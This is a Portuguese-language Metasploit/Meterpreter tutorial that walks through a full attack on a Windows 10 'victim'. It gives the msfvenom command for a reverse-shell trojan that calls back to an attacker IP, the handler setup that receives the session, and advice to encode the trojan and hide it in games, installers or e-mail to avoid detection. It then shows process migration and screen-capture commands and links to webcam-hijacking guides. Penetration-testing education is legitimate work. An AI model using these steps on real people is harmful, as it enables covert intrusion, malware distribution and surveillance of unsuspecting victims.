# Metasploit Framework (Meterpreter)

Uma das ferramentas mais poderosas e amplamente utilizadas para testes de penetração.

Através dessa ferramenta, é possível realizar buscas por vulnerabilidades e explorá-las. O framework contém um repositório de **exploits** (códigos executáveis capazes de aproveitar as vulnerabilidades de sistemas em um computador local ou remoto) e, por exemplo, ganhar acesso ao computador alvo.

A maioria de seus recursos pode ser encontrada em - www.metasploit.com.

## Objetivos

Neste tutorial, apresentamos os comandos principais para uso do framework Metasploit assim como um exemplo de ataque obtendo acesso remoto ao computador da vítima e realizar as seguintes ações:

- Tirar uma screenshot da tela da vítima.
- Tirar uma foto através da webcam da vítima.
- Capturar o stream de vídeo da webcam da vítima.

## Instalação

A distribuição Kali Linux possui a versão da comunidade Metasploit embutida e centenas de outras ferramentas que facilitam os passos deste tutorial. 

Mas se você quiser instalar o Metasploit como uma ferramenta separada, você pode fazê-lo facilmente em sistemas executados no Linux ou Mac OS X:

```
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
  chmod 755 msfinstall && \
  ./msfinstall
```

Para instalar o Kali Linux, recomendamos utilizar uma imagem pré-configurada da máquina virtual Kali Linux e incializá-la com o Virtual box.


1. Para baixar o Virtual Box, vá para www.virtualbox.org/wiki/Downloads e selecione a versão para o seu SO e configuração de hardware do seu sistema

2. Para instalar o Kali Linux, vamos baixar a imagem pré-configuradas para o Virtual Box neste [link](https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-hyperv-image-download/)


![Baixar Kali Linux](https://raw.githubusercontent.com/davicedraz/metasploit/master/img/install_kali_linux.jpg)


Mas também é possível baixar e instalar a distribuição Kali disponível no site oficial: www.kali.org/downloads/.

3. Agora, vamos abrir o VirtualBox e adicionar uma nova máquina. Selecione e abra a imagem do Kali Linux e inicie a máquina virtual.

Agora você pode iniciar o seu Kali. Seu nome de usuário padrão será **root** e sua senha **toor**.

Seja no seu Kali Linux ou após instalar corretamente o framework metasploit, mantenha-o sempre atualizado com o comando:

> msfupdate


## Iniciando o Metasploit

No seu Kali Linux devidamenta instalado, abra o console do Metasploit no Kali seguindo o caminho: Aplicativos → Ferramentas de exploração → Metasploit.

Ou em qualquer OS que tenha instalado o Metasploit, digite o seguinte comando no terminal:

> msfconsole

Aqui podemos ver a quantidade de **exploits** e **payloads** disponíveis no *Metasploit* para serem usados em um teste de penetração.

![Baixar Kali Linux](https://raw.githubusercontent.com/davicedraz/metasploit/master/img/msfconsole.JPG)

## Comandos Principais

Dentro do **msfconsole** temos uma infinidade de comandos e seria impossível explicar cada um deles neste tutorial. Apresentamos aqui os comandos básicos que deve ser suficiente para utilizar essa poderosa ferramenta no exemplo prática que faremos em seguida.

Quando o Metasploit fo inicializado e o **msfconsole** estiver sendo executado, podemos digitar "help" para obter uma visão geral dos comandos uma descrição:

Com o comando "show" podemos visualizar no console qualquer coleção desejada (payloads, exploits, opções, etc)
Ex:

> show exploits

Este comando lista todos os exploits disponíveis, que podem ser selecionados com o comando "use".

Ex: 
> use multi/handler

Quando um exploit é selecionado com o comando use, podemos recuperar informações como nome, plataforma, autor, destinos disponíveis e muito mais usando o comando "info". 

![Info](https://www.hackingtutorials.org/wp-content/uploads/2016/04/Metasploit-info-command-4.jpg)

É possível utilizar o "help" e "show" para obter ajuda com os comandos disponíveis.

Mergulhe na [documentação](https://metasploit.help.rapid7.com/docs) para aprender sobre outros comandos básicos avançados do framework Metasploit. 

Por hora, vamos seguir com o que aprendemos para um exemplo prático de ataque. 


## Exemplo de ataque com Meterpreter

Em exemplo prático utilizaremos como alvo uma virtualização do **Windows 10 Home Edition**. 

Esta escolha foi feita pensando em uma situação que melhor representa uma situação do cotidiano, já que, segundo o [StatCounter]( http://gs.statcounter.com/press/android-overtakes-windows-for-first-time) o Windows é o segundo sistema operacional mais utilizado, perdendo apenas para o Android. 

Desta forma, sendo o Windows 10 a versão mais recente do sistema da Microsoft o escolhemos para mostrar que a ferramenta Metasploit pode ser utilizada até mesmo em um sistema comercial e supostamente seguro como o Windows 10.

Segundo a Microsoft, todas as vulnerabilidades do Windows 10 foram consertadas. De fato, os esforços da empresa dificultaram o uso de exploits remotos. Em nossas pesquisas, não foram encontradas formas de infectar uma máquina Windows 10 através de exploits remotos. Por isso, infectaremos a máquina da vítima através de um **Trojan**.


### Trojan

O Trojan se passa por um programa que simula alguma funcionalidade útil quando de fato ele esconde um programa que pode causar malefícios aos computadores e seus usuários, como abrir portas e possibilitar invasões ou roubar senhas de usuário.

Os dois tipos mais comuns de Trojans são os Keyloggers (que normalmente são utilizados para roubar senhas) e os Backdoors (arquivos que possibilitam aberturas de portas para invasão). 

### Payload 

Diferente dos Vírus e Worms, um trojan não se auto copia, não necessitam infectar outros programas para executar suas funções, necessitando apenas ser executados para dar início ao ataque.

Em segurança, o termo _payload_ geralmente se refere à parte do código malicioso que executa alguma ação. Para realizar nosso ataque, vamos utilizá-lo para infectar a máquina da vítima.

Vamos utilizar o **msfvenom** para gerar o nosso trojan e infectar a vítima com um arquivo executável malicioso que será responsável por abrir uma conexão entre dispositivo alvo e a máquina do atacante.

```
msfvenom -p windows/meterpreter/reverse_tcp —platform windows -a x86 -f exe LHOST=_“attacker ip”_ LPORT=444 -o /root/Desktop/trojan.exe
```

Aqui efinimos a porta para 444 e o seu IP público ou IP local da máquina que estamos utilizando para o ataque.

Através deste comando, o payload será gerado no formato .exe para infectar a máquina alvo. Ao ser executado, o trojan gerado tentará se conectar a este IP através desta porta, estabelecendo uma conexão para ser explorada.


![Gerar payload](https://raw.githubusercontent.com/davicedraz/metasploit/master/img/payload.JPG)


Esse processo é bastante simples, a parte mais difícil é executar o trojan na máquina alvo sem ser detectado. Anexar o arquivo junto com dados de instalação de jogos ou programas pode funcionar muito bem.

### Exploit

Agora que temos nosso payload configurado para ser executado no alvo, iremos preparar nosso ambiente para explorar a vulnerabilidade através de um **exploit**.

1. Voltamos ao nosso terminal do **metasploit** através do comando:

> msfconsole

Agora podemos usar os comandos >msf 

2. Faremos uso do handler para estabelecer uma conexão:

> use multi/handler

3.  Indicamos que a conxão será estabelecida através do payload reverse_tcp, ou seja, a máquina alvo irá se conectar a máquina atacante e da execução do multi/handler exploit: 

> set PAYLOAD windows/meterpreter/reverse_tcp

 4.  Setamos a porta local para 444 para estabelecer a conexão
 
 > set LPORT 444

5. Configuramos  IP do atacante (seu IP):

> set LHOST “attacker ip”

6. Executamos o reverse_tcp através do comando:

> exploit

![Multi handler](https://raw.githubusercontent.com/davicedraz/metasploit/master/img/multi_handler.JPG)

Agora só esperar a vítima executar o trojan para estabelecer uma conexão.


### Executando o payload

Como foi dito anteriormente, a parte mais difícil é executar o trojan na máquina alvo. Distribuir o arquivo .exe bruto é uma má idéia, a melhor forma de infectar o alvo é codificá-lo e anexá-lo a um aplicativo normal ou a um jogo ou até mesmo a um e-mail. 

Assim que o arquivo trojan.exe for executado no alvo, uma sessão será iniciada na máquina do atacante , permitindo que você execute comandos do sistema, comandos de rede, e muito mais.

Uma vez que o trojan esteja em execução, será executada uma sessão do **meterpreter**.

![Conexão estabelecida](https://raw.githubusercontent.com/davicedraz/metasploit/master/img/session_opened.JPG)


## Meterpreter

Agora que temos acesso à maquina da vítima podemos utilizar uma da ferramentas mais importantes do Metasploit, o **Meterpreter**.

O Meterpreter é um payload, dinamicamente extensível, que utiliza injeção de DLL através de uma conexão entre vítima e atacante e é estendida pela rede em tempo de execução. Fonte: 

Com o console do meterpreter aberto, vamos explorar algumas ações que a ferramenta nos permite realizar.

 ### Capturar tela da vítima
 
Como nossa vítima utiliza o Windows, para capturarmos sua tela primeiramente precisamos identificar o processo **Explorer.exe**. É ele que nos permitirá acessar a tela da nossa vítima. 
Utilize o comando **`ps`** para listar os processos que estão sendo executados.

![Listar processos](https://raw.githubusercontent.com/davicedraz/metasploit/master/img/listar_processos.PNG)

Ao identificar o *PID* do processo **Explorer.exe** utilize o comando **`migrate 260`**
 para migrar para este processo.
 
![migrar processo](https://github.com/davicedraz/metasploit/blob/master/img/migrate.PNG?raw=true)

Após ter migrado para o processo **Explorer.exe** com sucesso, precisamos utilizar a extensão **espia** do meterpreter para habilitar a captura de tela no computador da vítimas.
Para isso, insira o comando **`use espia`**.

![habilitar captura](https://github.com/davicedraz/metasploit/blob/master/img/use_espia.PNG?raw=true)

[Tirar Screenshot](https://www.offensive-security.com/metasploit-unleashed/screen-capture/)


[Hackear Webcam](https://null-byte.wonderhowto.com/how-to/hack-like-pro-secretly-hack-into-switch-on-watch-anyones-webcam-remotely-0142514/)



...


**Para fazer o download deste tutorial em PDF, [clique aqui](https://github.com/davicedraz/metasploit).**


## Links de referência:

http://www.khromozome.com/how-to-hack-windows-10-using-kali-linux/

https://linuxhint.com/metasploit-tutorial/

https://www.tutorialspoint.com/metasploit/metasploit_environment_setup.htm

https://www.hackingtutorials.org/metasploit-tutorials/metasploit-commands/

https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/

#
_“Metasploit is not hacking instant tool, it is an insane framework”_
##### Autores: Davi Cedraz e Samuel Alves
<!--stackedit_data:
eyJoaXN0b3J5IjpbNDU4ODgzMzk0LDk5OTI3NDcyNywxMjk5Mj
czMjQ2LDk5OTI3NDcyNywtMzkxNDg2MzcxLC0xNTMyNDYzNjYy
LC0xODQ4NjgzNDgzLC0yMDE5Mjk1Njk2LDI4MTc0NTYzOSwtNz
ExMDU2Njc0LDI4MTc0NTYzOSw2MTYyMjMwMDEsLTMxNTU1NDE1
MCwyMTEzOTg5Nzk1LDEzMTUzODgwNjgsMTMwMDA3MTEzMiw4Mj
k1Mjg3NDEsMTMwMDA3MTEzMiw1NzM3MjgxOTMsMTA1Mjg5Mzk5
N119
-->